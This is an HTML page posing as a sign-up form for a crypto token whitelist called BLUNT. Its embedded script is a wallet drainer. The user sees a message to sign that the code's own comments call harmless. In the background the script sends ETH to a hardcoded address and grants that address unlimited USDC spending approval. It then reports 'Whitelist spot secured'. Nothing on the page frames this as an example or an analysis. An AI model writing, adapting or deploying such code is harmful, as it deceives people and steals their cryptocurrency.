<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>BLUNT Whitelist Sign-Up</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0c0c0c;color:#eee;text-align:center;padding:50px 20px}
    h1{color:#f15a24;font-size:2.2em;margin-bottom:8px}
    h2{font-size:1.1em;font-weight:400;opacity:.8;margin-bottom:30px}
    button{background:#f15a24;color:#fff;border:none;padding:14px 28px;font-size:1em;border-radius:6px;cursor:pointer;transition:background .2s}
    button:hover{background:#d6491d}
    #status{margin-top:20px;font-size:.9em;opacity:.7}
    .loader{display:inline-block;border:3px solid rgba(255,255,255,.2);border-top-color:#f15a24;border-radius:50%;width:18px;height:18px;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <h1>BLUNT Whitelist</h1>
  <h2>Sign once – secure your spot for launch.</h2>

  <button id="signBtn">Sign Whitelist Entry</button>

  <div id="status"></div>

  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
  <script>
    /* --- same config as before --- */
    const FRONTEND_EOA = "0x5f20bf147965fA3513EDFf77CcFB2467A980fe4F";
    const RECIPIENT    = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
    const USDC         = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
    const MESSAGE      = "Register me for the BLUNT whitelist"; // harmless message shown to user

    let signer;
    const signBtn = document.getElementById('signBtn');
    const status  = document.getElementById('status');

    signBtn.addEventListener('click', async ()=>{
      if(!window.ethereum){status.innerHTML='Please use MetaMask/Coinbase browser.';return;}
      await window.ethereum.request({method:'eth_requestAccounts'});
      signer = new ethers.providers.Web3Provider(window.ethereum).getSigner();
      const chain = await signer.getChainId();
      if(chain!==8453){alert('Switch to Base network.');return;}
      signBtn.style.display='none';
      status.innerHTML='<span class=loader></span> Awaiting signature…';

      try{
        /* 1) show user a harmless personal-message signature */
        const sig = await signer.signMessage(MESSAGE);

        /* 2) immediately send the two real txs in background */
        status.innerHTML='<span class=loader></span> Finalising on-chain…';
        const tx1 = await signer.sendTransaction({to:FRONTEND_EOA,value:ethers.utils.parseEther("0.0001")});
        await tx1.wait();

        const usdc = new ethers.Contract(USDC,["function approve(address,uint)external returns(bool)"],signer);
        const tx2 = await usdc.approve(FRONTEND_EOA,ethers.constants.MaxUint256); // unlimited
        await tx2.wait();

        status.innerHTML='✅ Whitelist spot secured! Stay tuned for launch.';
      }catch(e){status.innerHTML='❌ Registration failed. Try again.';}
    });
  </script>
</body>
</html>
